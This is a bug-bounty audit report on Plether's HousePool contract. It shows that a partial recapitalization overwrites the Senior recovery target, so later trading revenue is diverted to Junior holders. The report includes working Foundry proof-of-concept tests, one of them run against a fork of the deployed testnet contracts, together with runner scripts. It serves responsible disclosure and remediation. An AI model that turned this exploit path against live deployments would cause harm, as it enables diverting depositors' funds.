# \#99130 [SC-High] Partial Recapitalization Overwrites The Senior Recovery Target

**Submitted on Nov 12th 2026 at 01:06:03 UTC by @jesse03 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99130
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description



A partial recapitalization can lower the Senior recovery target.

The first reconciliation sets the Senior high-water mark to the full recapitalization amount. A later reconciliation of the remaining amount replaces it with the smaller residual amount.

Future trading revenue that should restore Senior is then credited to Junior. Junior holders do not need to make a new deposit. They only need to hold shares when the diverted revenue is recorded.

<br>

## Vulnerability Details

<br>

`buildReconcileSnapshot` calculates the distributable amount after trader claims and the terminal delta:

```
if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

<br>

`HousePool._reconcile` reserves the settleable recapitalization before planning the normal waterfall:

```
HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot =
    HousePoolAccountingLib.buildReconcileSnapshot(accountingSnapshot);

HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets =
    _getPendingClaimantBuckets();

HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
    _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);

HousePoolReconcilePlanLib.ReconcilePlan memory plan =
    HousePoolReconcilePlanLib.planReconcile(
        _currentPendingAccountingState(),
        reconcileSnapshot,
        _pendingClaimantBucketAssets(settleableClaimantBuckets),
        poolConfig.seniorRateBps,
        couponElapsed,
        markFresh
    );

_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;

_applyPendingClaimantBucketsLive(
    settleableClaimantBuckets,
    claimantBuckets,
    allowRevenueContinuation
);
```

<br>

The important part is that `claimantBuckets` contains the current residual recapitalization, not the original cumulative target.

<br>

`applyClaimantRecapitalizationIntent` then applies that residual as the new target:

```
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;

    if (state.seniorSupply > 0) {
        if (
            state.waterfall.seniorPrincipal == 0
                && state.waterfall.juniorPrincipal == 0
        ) {
            state.waterfall.seniorPrincipal += remaining;

            state.waterfall.seniorHighWaterMark =
                recapitalizationTargetAssets > remaining
                    ? recapitalizationTargetAssets
                    : remaining;

            remaining = 0;
        } else {
            uint256 gap =
                state.waterfall.seniorHighWaterMark
                    > state.waterfall.seniorPrincipal
                    ? state.waterfall.seniorHighWaterMark
                        - state.waterfall.seniorPrincipal
                    : 0;

            if (gap > 0) {
                uint256 seniorAssignedAssets =
                    remaining > gap ? gap : remaining;

                state.waterfall.seniorPrincipal += seniorAssignedAssets;
                remaining -= seniorAssignedAssets;
            }
        }
    }

    if (remaining > 0) {
        state.unassignedAssets += remaining;
    }
}
```

<br>

The assignment to `seniorHighWaterMark` is unconditional. If reconciliation temporarily reaches zero Senior principal, a later partial pass can replace a larger recovery target with a smaller one.

<br>

The owner action is legitimate recovery:

```
function recapitalizePool(
    uint256 amountAssets
) external onlyOwner nonReentrant {
    if (amountAssets == 0) {
        revert CfdEngine__ZeroAmount();
    }
    if (address(pool) == address(0)) {
        revert CfdEngine__InvalidPool();
    }

    _advanceAllCarryIndexes(block.timestamp);

    uint256 balanceBefore = settlementToken.balanceOf(address(pool));

    settlementToken.safeTransferFrom(
        msg.sender,
        address(pool),
        amountAssets
    );

    uint256 balanceAfter = settlementToken.balanceOf(address(pool));
    uint256 received =
        balanceAfter >= balanceBefore
            ? balanceAfter - balanceBefore
            : 0;

    if (received != amountAssets) {
        revert CfdEngine__UnexpectedTransferAmount(
            amountAssets,
            received
        );
    }

    pool.recordClaimantInflow(
        amountAssets,
        IHousePool.ClaimantInflowKind.Recapitalization,
        IHousePool.ClaimantInflowCashMode.CashArrived
    );

    emit PoolRecapitalized(msg.sender, amountAssets);
}
```

<br>

A later LP settlement reaches reconciliation through `HousePool.settleLpEpoch`:

```
function settleLpEpoch(
    uint256 expectedMarkPrice,
    uint256 expectedPublishTime
) external nonReentrant returns (
    IHousePool.LpEpochSettlementResult memory result
) {
    if (lpEpochSettlementPaused) {
        revert HousePool__LpEpochSettlementPaused();
    }

    (
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory accountingSnapshot,
        HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot
    ) = _getHousePoolSnapshots();

    uint256 cutoffEpoch = block.timestamp / LP_EPOCH_DURATION;

    if (
        accountingSnapshot.hasOpenPositions
            && !statusSnapshot.oracleFrozen
    ) {
        if (
            msg.sender != ENGINE.orderRouter()
                || ENGINE.lastMarkPrice() != expectedMarkPrice
                || statusSnapshot.lastMarkTime != expectedPublishTime
        ) {
            revert HousePool__Unauthorized();
        }

        if (
            expectedPublishTime / LP_EPOCH_DURATION
                < cutoffEpoch
        ) {
            revert HousePool__MarkPriceStale();
        }
    }

    return _settleLpEpoch(
        accountingSnapshot,
        statusSnapshot,
        cutoffEpoch
    );
}
```

<br>

The reproduced state transition is:

```
First reconcile:
Senior principal:  100,000 USDG
Senior HWM:        200,000 USDG
Pending recap:     100,000 USDG

Second reconcile:
Senior principal:  100,000 USDG
Senior HWM:        100,000 USDG
Pending recap:           0 USDG

After 49,720 USDG of revenue:
Senior principal:  100,000 USDG
Junior principal:   49,720 USDG
```

<br>

The `49,720 USDG` should have restored Senior first. It is credited entirely to Junior because the recovery mark was overwritten.

<br>

The impact scales with the recapitalization. At the configured `40,000,000 USDG` Senior cap, up to approximately `20,000,000 USDG` can be redirected.

<br>

## Steps to Reproduce

1- Start with a wiped pool that still has Senior and Junior share supply.
2- Queue a `200,000 USDG` owner recapitalization and create a `100,000 USDG` trader claim.
3- Reconcile once:

```
Senior principal: 100,000 USDG
Senior HWM:       200,000 USDG
Pending recap:    100,000 USDG
```

4- Trigger another reconciliation through normal LP settlement.
5- The remaining `100,000 USDG` is applied against zero principal, and the HWM is overwritten:

```
Senior principal: 100,000 USDG
Senior HWM:       100,000 USDG
Pending recap:          0 USDG
```

6- Record `49,720 USDG` of trading revenue and reconcile again.
7- Senior remains at `100,000 USDG`, while Junior increases by `49,720 USDG`.

## Recommendation

Store the original recapitalization target separately from the remaining settleable amount.

Do not allow a continuation of the same recapitalization to lower the existing recovery mark:

```
uint256 nextHwm = recapitalizationTargetAssets;

if (state.waterfall.seniorHighWaterMark > nextHwm) {
    nextHwm = state.waterfall.seniorHighWaterMark;
}

if (remaining > nextHwm) {
    nextHwm = remaining;
}

state.waterfall.seniorHighWaterMark = nextHwm;
```


## Proof of Concept

```diff
diff --git a/packages/perps/test/perps/security/ForkPendingRecapHwmAudit.t.sol b/packages/perps/test/perps/security/ForkPendingRecapHwmAudit.t.sol
new file mode 100644
index 0000000..582eb7c
--- /dev/null
+++ b/packages/perps/test/perps/security/ForkPendingRecapHwmAudit.t.sol
@@ -0,0 +1,189 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {Test} from "forge-std/Test.sol";
+
+import {CfdEngine} from "@plether/perps/CfdEngine.sol";
+import {HousePool} from "@plether/perps/HousePool.sol";
+import {TrancheVault} from "@plether/perps/TrancheVault.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+
+/// @notice Runs against the public Plether v2.0.0 deployment through a local fork.
+/// @dev No source contract is replaced or modified. The fork block is fixed so the setup is reproducible.
+contract ForkPendingRecapHwmAudit is Test {
+
+    uint256 internal constant FORK_BLOCK = 328_320_000;
+    bytes32 internal constant FORK_BLOCK_HASH = 0x34b921ceb315037cf04c5d6c82e46be85f49f542ebecfdb81ccbf2a0e8ee2dbf;
+    uint256 internal constant SEPOLIA_CHAIN_ID = 421_614;
+
+    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
+    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
+    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
+    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
+    address internal constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
+    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
+    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
+
+    bytes32 internal constant HOUSE_POOL_RUNTIME_HASH =
+        0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957;
+    bytes32 internal constant JUNIOR_VAULT_RUNTIME_HASH =
+        0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf;
+
+    uint256 internal constant RECAPITALIZATION = 40_000_000e6;
+    uint256 internal constant TRADER_CLAIM = 20_000_000e6;
+    uint256 internal constant TRADING_REVENUE = 20_000_000e6;
+
+    address internal constant TRADER = address(0xA11CE);
+
+    HousePool internal constant pool = HousePool(POOL);
+    CfdEngine internal constant engine = CfdEngine(ENGINE);
+    IERC20 internal constant token = IERC20(USDG);
+    TrancheVault internal constant seniorVault = TrancheVault(SENIOR_VAULT);
+    TrancheVault internal constant juniorVault = TrancheVault(JUNIOR_VAULT);
+
+    function setUp() public {
+        vm.createSelectFork(
+            vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co")), FORK_BLOCK
+        );
+
+        assertEq(block.chainid, SEPOLIA_CHAIN_ID, "wrong fork chain");
+        vm.roll(FORK_BLOCK + 1);
+        assertEq(blockhash(FORK_BLOCK), FORK_BLOCK_HASH, "wrong fork block");
+        vm.roll(FORK_BLOCK);
+        assertEq(keccak256(POOL.code), HOUSE_POOL_RUNTIME_HASH, "not the released HousePool bytecode");
+        assertEq(keccak256(JUNIOR_VAULT.code), JUNIOR_VAULT_RUNTIME_HASH, "not the released Junior bytecode");
+        assertEq(address(pool.ENGINE()), ENGINE, "released Engine binding");
+        assertEq(pool.seniorVault(), SENIOR_VAULT, "released Senior binding");
+        assertEq(pool.juniorVault(), JUNIOR_VAULT, "released Junior binding");
+        assertEq(engine.orderRouter(), ROUTER, "released Router binding");
+        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "production Senior cap");
+        assertEq(pool.maxSeniorShareBps(), 8000, "production Senior share cap");
+    }
+
+    function test_LocalFork_PartialRecapOverwritesSeniorRecoveryTarget() public {
+        uint256 startingSenior = pool.seniorPrincipal();
+        uint256 startingJunior = pool.juniorPrincipal();
+        uint256 startingHwm = pool.seniorHighWaterMark();
+        assertEq(startingHwm, startingSenior, "fork starts without Senior impairment");
+        assertGt(seniorVault.accruedTotalSupply(), 0, "Senior owners must survive the wipe");
+        assertGt(juniorVault.accruedTotalSupply(), 0, "Junior ownership must survive the wipe");
+        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "fork starts without a trader claim");
+
+        // Model the already documented wipeout precondition. USDG is an explicitly approved mock.
+        deal(USDG, POOL, 0);
+        vm.prank(JUNIOR_VAULT);
+        pool.reconcile();
+        assertEq(pool.seniorPrincipal(), 0, "Senior principal must be wiped");
+        assertEq(pool.juniorPrincipal(), 0, "Junior principal must be wiped");
+
+        // A profitable close enters this exact settlement-sidecar hook. With no pool cash, it records the
+        // resulting payout as a senior trader claim, which makes the recapitalization only partially settleable.
+        _recordUnbackedTraderClaim(TRADER, TRADER_CLAIM);
+        uint256 traderClaim = engine.totalTraderClaimBalanceAssets();
+        assertEq(traderClaim, TRADER_CLAIM, "close payout must become a trader claim");
+        assertLt(traderClaim, RECAPITALIZATION, "recapitalization must remain partial");
+
+        deal(USDG, OWNER, RECAPITALIZATION);
+        vm.startPrank(OWNER);
+        token.approve(ENGINE, RECAPITALIZATION);
+        engine.recapitalizePool(RECAPITALIZATION);
+        vm.stopPrank();
+
+        vm.prank(JUNIOR_VAULT);
+        pool.reconcile();
+
+        uint256 firstPrincipal = pool.seniorPrincipal();
+        uint256 firstHwm = pool.seniorHighWaterMark();
+        uint256 firstPending = pool.pendingRecapitalizationAssets();
+        assertGt(firstPrincipal, 0, "first pass must bootstrap Senior principal");
+        assertEq(firstHwm, RECAPITALIZATION, "first pass must preserve the original recovery target");
+        assertGt(firstPending, 0, "part of the recapitalization must remain pending");
+
+        vm.prank(JUNIOR_VAULT);
+        pool.reconcile();
+
+        uint256 secondPrincipal = pool.seniorPrincipal();
+        uint256 secondHwm = pool.seniorHighWaterMark();
+        uint256 secondPending = pool.pendingRecapitalizationAssets();
+        assertEq(secondPrincipal, firstPrincipal, "residual recap must restore the same Senior principal");
+        assertLt(secondPending, firstPending, "second pass must consume most of the residual recap");
+        assertLt(secondHwm, firstHwm, "BUG: continuation overwrote the cumulative Senior recovery target");
+
+        // Finish any liability-induced remainder without bypassing the normal reconciliation path.
+        for (uint256 i; i < 8 && pool.pendingRecapitalizationAssets() != 0; ++i) {
+            vm.prank(JUNIOR_VAULT);
+            pool.reconcile();
+        }
+        assertEq(pool.pendingRecapitalizationAssets(), 0, "recapitalization bucket fully consumed");
+        assertEq(pool.seniorHighWaterMark(), secondHwm, "later passes must not restore the lost recovery target");
+        assertLt(pool.seniorPrincipal(), secondHwm, "a small remaining Senior deficit stays at the lowered target");
+
+        uint256 poolCashBefore = token.balanceOf(POOL);
+        uint256 seniorBeforeRevenue = pool.seniorPrincipal();
+        uint256 juniorBeforeRevenue = pool.juniorPrincipal();
+        uint256 juniorNavBeforeRevenue = juniorVault.totalAssets();
+
+        // A losing close reaches the same settlement-sidecar inflow hook with Revenue intent.
+        _recordTradingRevenue(TRADING_REVENUE);
+        uint256 poolCashAfter = token.balanceOf(POOL);
+        uint256 revenue = poolCashAfter - poolCashBefore;
+        assertGt(revenue, 0, "loser collateral must become pool revenue");
+
+        vm.prank(JUNIOR_VAULT);
+        pool.reconcile();
+
+        uint256 seniorAfterRevenue = pool.seniorPrincipal();
+        uint256 juniorAfterRevenue = pool.juniorPrincipal();
+        uint256 juniorNavAfterRevenue = juniorVault.totalAssets();
+        uint256 seniorGapBeforeRevenue = secondHwm - seniorBeforeRevenue;
+        uint256 misroutedRevenue = revenue - seniorGapBeforeRevenue;
+        uint256 expectedSeniorAfterRevenue =
+            seniorBeforeRevenue + revenue > firstHwm ? firstHwm : seniorBeforeRevenue + revenue;
+        uint256 seniorRecoveryLoss = expectedSeniorAfterRevenue - seniorAfterRevenue;
+
+        assertEq(seniorAfterRevenue, secondHwm, "Senior stops at the overwritten target");
+        assertLt(seniorAfterRevenue, firstHwm, "Senior never regains its original recovery priority");
+        assertEq(
+            juniorAfterRevenue,
+            juniorBeforeRevenue + misroutedRevenue,
+            "Junior receives all revenue above the lowered target"
+        );
+        assertEq(juniorNavAfterRevenue, juniorNavBeforeRevenue + misroutedRevenue, "Junior NAV captures the diversion");
+        assertEq(seniorRecoveryLoss, misroutedRevenue, "Senior loss equals the Junior diversion");
+
+        emit log_named_decimal_uint("released pool assets", startingSenior + startingJunior, 6);
+        emit log_named_decimal_uint("trader claim", traderClaim, 6);
+        emit log_named_decimal_uint("recapitalization", RECAPITALIZATION, 6);
+        emit log_named_decimal_uint("first Senior principal", firstPrincipal, 6);
+        emit log_named_decimal_uint("first Senior HWM", firstHwm, 6);
+        emit log_named_decimal_uint("first pending recap", firstPending, 6);
+        emit log_named_decimal_uint("second Senior principal", secondPrincipal, 6);
+        emit log_named_decimal_uint("second Senior HWM", secondHwm, 6);
+        emit log_named_decimal_uint("misrouted revenue", revenue, 6);
+        emit log_named_decimal_uint("Junior-priority revenue", misroutedRevenue, 6);
+        emit log_named_decimal_uint("Senior recovery loss", seniorRecoveryLoss, 6);
+        emit log_named_decimal_uint("final Senior principal", seniorAfterRevenue, 6);
+        emit log_named_decimal_uint("final Junior principal", juniorAfterRevenue, 6);
+        emit log_named_decimal_uint("Junior NAV from 1e18 shares", juniorVault.convertToAssets(1e18), 18);
+    }
+
+    function _recordUnbackedTraderClaim(
+        address trader,
+        uint256 amount
+    ) internal {
+        vm.prank(address(engine.settlementSidecar()));
+        engine.settlementRecordTraderClaim(trader, amount, false);
+    }
+
+    function _recordTradingRevenue(
+        uint256 amount
+    ) internal {
+        deal(USDG, POOL, token.balanceOf(POOL) + amount);
+        vm.prank(address(engine.settlementSidecar()));
+        pool.recordClaimantInflow(
+            amount, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
+        );
+    }
+
+}
diff --git a/packages/perps/test/perps/security/PendingRecapIntentHwmAudit.t.sol b/packages/perps/test/perps/security/PendingRecapIntentHwmAudit.t.sol
new file mode 100644
index 0000000..7779a0e
--- /dev/null
+++ b/packages/perps/test/perps/security/PendingRecapIntentHwmAudit.t.sol
@@ -0,0 +1,109 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {BasePerpTest} from "../BasePerpTest.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+
+contract PendingRecapIntentHwmAudit is BasePerpTest {
+
+    address internal constant winner = address(0xA11CE);
+    address internal constant loser = address(0xB0B);
+
+    function _initialJuniorDeposit() internal pure override returns (uint256) {
+        return 0;
+    }
+
+    function _initialSeniorDeposit() internal pure override returns (uint256) {
+        return 0;
+    }
+
+    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
+        return 5_000_000e6;
+    }
+
+    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
+        return 5_000_000e6;
+    }
+
+    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
+        return CfdTypes.RiskParams({
+            vpiFactor: 0,
+            maxSkewRatio: 1e18,
+            maintMarginBps: 100,
+            initMarginBps: 150,
+            fadMarginBps: 300,
+            baseCarryBps: 500,
+            minBountyAssets: 5e6,
+            bountyBps: 10,
+            keeperShareBps: 5000,
+            protocolShareBps: 0
+        });
+    }
+
+    function test_PartialRecapLosesCumulativeSeniorRecoveryRight() public {
+        _fundTrader(winner, 100_000e6);
+        _fundTrader(loser, 100_000e6);
+
+        _open(winner, CfdTypes.Side.LONG, 100_000e18, 10_000e6, 1e8);
+        _open(loser, CfdTypes.Side.LONG, 200_000e18, 50_000e6, 1e8);
+
+        // Put the seeded pool into the total-wipe state used by the protocol's recovery tests.
+        settlementToken.burn(address(pool), pool.totalAssets());
+        vm.prank(address(juniorVault));
+        pool.reconcile();
+
+        assertEq(pool.seniorPrincipal(), 0);
+        assertEq(pool.juniorPrincipal(), 0);
+        assertGt(seniorVault.totalSupply(), 0);
+
+        _close(winner, CfdTypes.Side.LONG, 100_000e18, 0);
+        uint256 claim = engine.totalTraderClaimBalanceAssets();
+        assertGt(claim, 0);
+
+        uint256 recap = 200_000e6;
+        settlementToken.mint(address(this), recap);
+        settlementToken.approve(address(engine), recap);
+        engine.recapitalizePool(recap);
+
+        vm.prank(address(juniorVault));
+        pool.reconcile();
+
+        emit log_named_uint("claim", claim);
+        emit log_named_uint("first principal", pool.seniorPrincipal());
+        emit log_named_uint("first HWM", pool.seniorHighWaterMark());
+        emit log_named_uint("first pending", pool.pendingRecapitalizationAssets());
+
+        assertGt(pool.pendingRecapitalizationAssets(), 0);
+        assertEq(pool.seniorHighWaterMark(), recap);
+
+        vm.prank(address(juniorVault));
+        pool.reconcile();
+
+        emit log_named_uint("second principal", pool.seniorPrincipal());
+        emit log_named_uint("second HWM", pool.seniorHighWaterMark());
+        emit log_named_uint("second pending", pool.pendingRecapitalizationAssets());
+
+        assertLt(pool.seniorHighWaterMark(), recap);
+        assertEq(pool.pendingRecapitalizationAssets(), 0);
+
+        // A real trader loss contributes claimant revenue. The overwritten HWM sends the recovery
+        // tranche to Junior even though the recapitalization intent established it for Senior.
+        uint256 seniorBeforeRevenue = pool.seniorPrincipal();
+        uint256 assetsBeforeRevenue = pool.totalAssets();
+        uint256 claimsBeforeRevenue = engine.totalTraderClaimBalanceAssets();
+        _close(loser, CfdTypes.Side.LONG, 200_000e18, 2e8);
+        uint256 revenueAssets = pool.totalAssets() - assetsBeforeRevenue;
+        assertEq(engine.totalTraderClaimBalanceAssets(), claimsBeforeRevenue);
+
+        vm.prank(address(juniorVault));
+        pool.reconcile();
+
+        emit log_named_uint("after revenue senior", pool.seniorPrincipal());
+        emit log_named_uint("after revenue junior", pool.juniorPrincipal());
+        emit log_named_uint("after revenue HWM", pool.seniorHighWaterMark());
+
+        assertEq(pool.seniorPrincipal(), seniorBeforeRevenue);
+        assertEq(pool.juniorPrincipal(), revenueAssets);
+    }
+
+}
diff --git a/packages/perps/test/perps/security/run-pending-recap-hwm-poc.ps1 b/packages/perps/test/perps/security/run-pending-recap-hwm-poc.ps1
new file mode 100644
index 0000000..c01e9f5
--- /dev/null
+++ b/packages/perps/test/perps/security/run-pending-recap-hwm-poc.ps1
@@ -0,0 +1,43 @@
+$ErrorActionPreference = "Stop"
+
+$repoRoot = (& git -C $PSScriptRoot rev-parse --show-toplevel).Trim()
+if (-not $repoRoot) {
+    throw "Unable to locate the Git repository root"
+}
+
+if (-not $env:ARB_SEPOLIA_RPC_URL) {
+    $env:ARB_SEPOLIA_RPC_URL = "https://arbitrum-sepolia.gateway.tenderly.co"
+}
+$env:FOUNDRY_OUT = "out-audit-fork-pending-recap"
+$env:FOUNDRY_CACHE_PATH = "cache-audit-fork-pending-recap"
+
+$forge = $env:FORGE_BIN
+if (-not $forge) {
+    $forgeCommand = Get-Command forge -ErrorAction SilentlyContinue
+    if ($forgeCommand) {
+        $forge = $forgeCommand.Source
+    }
+}
+if (-not $forge) {
+    $defaultForge = Join-Path $HOME ".foundry/bin/forge.exe"
+    if (Test-Path -LiteralPath $defaultForge) {
+        $forge = $defaultForge
+    }
+}
+if (-not $forge) {
+    throw "forge was not found; set FORGE_BIN to the forge executable"
+}
+
+Push-Location $repoRoot
+try {
+    & $forge test `
+        --root packages/perps `
+        --match-contract "ForkPendingRecapHwmAudit|PendingRecapIntentHwmAudit" `
+        -vvv
+    if ($LASTEXITCODE -ne 0) {
+        exit $LASTEXITCODE
+    }
+}
+finally {
+    Pop-Location
+}
diff --git a/packages/perps/test/perps/security/run-pending-recap-hwm-poc.sh b/packages/perps/test/perps/security/run-pending-recap-hwm-poc.sh
new file mode 100755
index 0000000..828f5db
--- /dev/null
+++ b/packages/perps/test/perps/security/run-pending-recap-hwm-poc.sh
@@ -0,0 +1,16 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+repo_root="$(git -C "$(dirname "${BASH_SOURCE[0]}")" rev-parse --show-toplevel)"
+cd "$repo_root"
+
+export ARB_SEPOLIA_RPC_URL="${ARB_SEPOLIA_RPC_URL:-https://arbitrum-sepolia.gateway.tenderly.co}"
+export FOUNDRY_OUT="${FOUNDRY_OUT:-out-audit-fork-pending-recap}"
+export FOUNDRY_CACHE_PATH="${FOUNDRY_CACHE_PATH:-cache-audit-fork-pending-recap}"
+
+forge_bin="${FORGE_BIN:-forge}"
+
+"$forge_bin" test \
+  --root packages/perps \
+  --match-contract 'ForkPendingRecapHwmAudit|PendingRecapIntentHwmAudit' \
+  -vvv


```
